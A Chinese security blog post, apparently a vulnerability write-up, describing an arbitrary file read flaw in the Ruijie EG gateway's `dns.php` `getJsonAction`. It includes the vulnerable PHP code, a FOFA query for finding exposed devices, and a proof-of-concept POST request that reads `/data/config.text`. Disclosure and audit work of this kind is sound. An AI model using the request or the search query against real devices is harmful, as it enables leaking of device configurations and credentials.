---
title: "锐捷-EWEB dns.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-dns-fileread.html
asset_dir: assets/锐捷-eweb-dns.php-文件读取漏洞
---

# 锐捷-EWEB dns.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/10 08:30
- 1178浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

SQL注入防护

文件大小转换

授权

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `dns.php` 的 `getJsonAction` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞修复方案

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

直接看 `ddi/server/dns.php` 中的 `getJsonAction` 方法实现

```
public function getJsonAction() {
        $file = p('path');
        file_put_contents($file, iconv('gbk', 'utf-8', file_get_contents($file)));
        $content = file_get_contents($file); //读取文件中的内容
        //$result = iconv('utf-8', 'gbk', $content);
        echo $content;
    }
```

直接将无任何过滤和校验 post 获取的 `path` 直接带入 `file_get_contents` 函数中进行文件操作，导致任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

深入探索

在线安全工具

企业安全咨询

SQL注入检测工具

```
POST /ddi/server/dns.php?a=getJson HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

path=/data/config.text
```

成功读取到 `/data/config.text` 文件内容

[![锐捷-EWEB dns.php 文件读取漏洞](images/img-001-73d0cb233f6a.webp)](https://image.mrxn.net/d88936a241d041ce8c20883b16d576e1.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKRklEQVR4Aeyci3YbNwxEffP//9x6BA0JkVhqE9tatWFOkAFnBuCaWPqR9PTXx8fHP1+Nfxa/qt62rzR5Rl3cKkZ/tc71lW6u8mVuzF33VdRAPnvs3+9yAm0gnxP/+J2oPgDgAx7DPSu/NaF16PXmpCu8fobyHkWurTxZH3OYn230aF31XXGqcbSBmNh47QlMA4H+FsCcrx7Xb0H2QPSoOAgNKG+na6D74Di3v0KY6+yDrq04f3xC+1YIvS/MeVU7DaQybe51J7AH8rqzPrXTjw9E11uRn0brMWC+0vbk2lVuP/Reo98eIYQve8QrKg7CDx2z7zvyHx/Idzzk39TjRwaiN8yxOkyY3zTXCV2rXOG1UOsxIPpJd8DMWasQjv3jflpXPb7C/chAPr7yRH957R7Im70A00B0DVexen6I6w4zruqkeU+YayE4e4SqGUO8IvNaK8xB9IL1zz6qcVS1EH2sVej6I6xqpoFUps297gTaQCAmDudw9Yj5jbAvcxB7POPGWog6wNLD3501cpFUey7sNwm47ZNrb8LBHxB+OIe5TRtIJnd+3QnsgVx39uXOv/I1/NO87Hwn3fO+vEHF3YSDPyCufiW7l7DSz3AQ/aF/oYfOuQd0TvsprCn/jtg3xCf6JnhqINDfDDjO/Ybkjw1mv3XoWlVrn7WMELX2CGHmxOeA8EC/Dblv9jq37rUQoo9yBcQaOopfBYQ3e04NJBdcmP8VW/+CmBIE5o8agvMb8gxdC1EH9VsIodufEUKDXpt1534W6H5rGSF0c64TmoPwQEfpDvu8zghRY09GCA06Zt19oOv7huQTeoN8D+QNhpAfYRoI9OvjK5ULnEP3QeTWKoTwQP9U5P5CCD3XQnAQWGmZW+XaQwHRCzpWddB1iDz7IDj1HCP7nNvj9RFOAzkybv41JzD9YFhtC/E2QEdPXDjWiHNY81poLqP4MbKuHOb9xa/CPc947BVWfuj7W4fOQeSqV9gjhNCUOyA4eR37hvh03gT3QN5kEH6MUwPxdcoIcd0A97r9FTX0dRMOEqDVQOSVNe/rHI79uQc8+lyfEcIDHXOP7HVu3euMEH0y59x1GSH8wMepgXz8n3+92cfWBgIxJU9SWD0rzD55c1R1mYO5h3UIDfq3x9Yyer+Ks5bRPuj9IfLsc26/EMIHHSufvDmg+81D56oebSAu2HjtCeyBXHv+0+5tINX1sRv6NVtx1p6h94K5b66F0M1BrKGjtYzQdXjMvbfQNdA95s4i9FqIXL0VVQ/xjkpvA6nEzb3+BNpfv1dbQ0y80jxloXUIP5xD1wnVR6H8TMirOOPNHujPlnnnELrXQu2jUO6A8IkfA2bNdc9w35BnJ/RifQ/kxQf+bLtpIBDXDfrPAflKuiF0H0RurfJbE1pXPoY14aidXavW4Rqvz6LrMubazJ/J4fGMVAPB5b7TQGTc8eUT+OMG00DytCAmCB2zfpTD2u+nzfXQayBy+1Z4tgdETziHeU+Imsx5XwgNOtoHv89NA3GzjdecQPsHKm8Pfap+C6wJoetQ5/I5IDxeC2HmvFdGeRUQ/qxBcNIdWT+Tuy5jVZf1Mbd/5LW2llG8w7zXwn1DdApvFHsgbzQMPUr7SR3mTwEyHIWvm9Ae5WNYqxBiT6CSG+eeQPsHrYqDrsNj3pr9QbLay+3sEZqrULqj0vcNqU7lQq4NpJoaxFtmLSOEBrTHB9obDJE38QWJn2+1FcRzwfoH31UPad4Lop84hzWvhTD7IDj7hW0gKtpx/QnsgVw/g4cnmAaia+MwPlTcF9aEd2oJENcT+qeKZUESIWq1lyPJLYXZZz+E1syfCQQHM37K7TeE7l7CJt4TCA/UeLc9gPoooNdMA3mo2IuXn8A0EOjT8tPAOU7TPgr3EkL0Uz4GhAaM0h+tgds3GkfPJT431lrxjIPom33OVX8U9hzhNJAj4+ZfcwJ7IK8559O7tL9chLiC+apBcFW37Kv0FefalUfaygfxbPYIVfMsIOqgY66BzkPk1iHWgKnf/n9FtsKDZN+Qg4O5il4ORG+dono44PbFEuZvY6FrELn6OKp+5uwRjhxEL5j3lFc1Cug+8QoITvoY0h3WvM5oTZj5o1y+MSpv9iwHUhVv7mdPoA3EU4J4k4DlzvYLgdttcYG4MawJ4dEvzgGhQUdrGSH0zDkf985riDrA9m9B4HYGUKM3ga5XXBuIxZ/HvcPqBPZAVqdzgdYGAnGVquudnwvCBx2tQ+cg8kozV2Hev9LN2ee1EB73FOeAWYNznHus0M8jtE+5o+Jg3r8NxAUbrz2BNhBPEmJqQHsya0KTyh3mVmiv0D7lDmD6ojhqXgvdo0LovSp95NRvjOyB3g8itw6Pa/HupdwBs89axjaQTO78uhPYA7nu7Mud2391YtXXLSPEdQNse/j00sh7kmvv1ANYz2TFAbd9VhqEB2jt7Bc28p6IGwO47QPcXY8w+vPaTqD1gMitCV2jfAxrwn1DxtO5eN0GAvNUYeb8vJrmUUDUAbY/IHB7mx7I+yL3vFM3L+DlDbNvzIFWA5Hfig7+yPUQ/oqD0KBj9jn3NtB95jLaD93XBpKN/8X8//LMeyBvNsn2D1TV9ametfJBv3JAVVZyQPvUYgPMXKVB+Kxl9DMKzStXQNRBR3sywqyr3mEvhM/rI4TwQcfKu29IdSoXctNA/AZkzM8HMeEjXd6VJt2RfRB9rZ1FiDqglQDt5nkPi14LzWUUr8hclcujqLQVpxqHfV4Lp4HYtPGaE9gDuebcD3dtP6lDXPPKqas0BoQfqEomDmifRibxk3D/z/TU77N+6PsCZW/g1LNB90HkbgixBkw9ReC2bzbuG5JP4w3y6dves8/kNzSjayEmD5h6QNdkEpjelsrnGpj91lwnNGeEqANMPSBwew7VOh4Mw8KeCrPVesVB7Ans/8Xfx/LX68Xpawj0acG5/Mxj+w0Rwty36gHhU42i8mQOwp8556ofw1qFEL2ASp444HazgEkTAdx05avYX0NWp3OBtgdywaGvtmwDGa/zs/Wqaa6tfNazZi6jdYjrnrUqH/1Q/yen9q162COE2F/5UeReR56Rh+iba9tARvNeX3MC00AgpgY1nnlM6LX2w8xZE0LXIfL85iiH4KGjah3yKLwWQvcCopah+jFWBcDtizXMuKrLGvTaaSDZuPPXn8AeyOvPfLnjtw5kvOpaQ1xH5Q6YOWsZV09uH0QvoLTbZwQOP8VArbk2ozfLnPOVBn0P+zJ+60By450fn8BK+ZGBwPot8APB7IPOwWPuN1DoHhVKd8BxD3uqHhUHvZd1CM5r4aqvNaG8Y/zIQMZN9vr8CeyBnD+rlzingegqreLMU1X1EFcb1j89n+mfPXkv89D3Mmef1xmtCTM/5tIdo5bXEPs/47LufBqIhY3XnEAbCMRU4RyuHhd6j8oHofttE1Y+c9IVEHWApdMInPp2V/soqsbQe1iXVwGzBjPnuoyqd7SBZMPOrzuBPZDrzr7c+V8AAAD///o1gLAAAAAGSURBVAMAMfhAuQfmku8AAAAASUVORK5CYII=)

手机扫码阅读
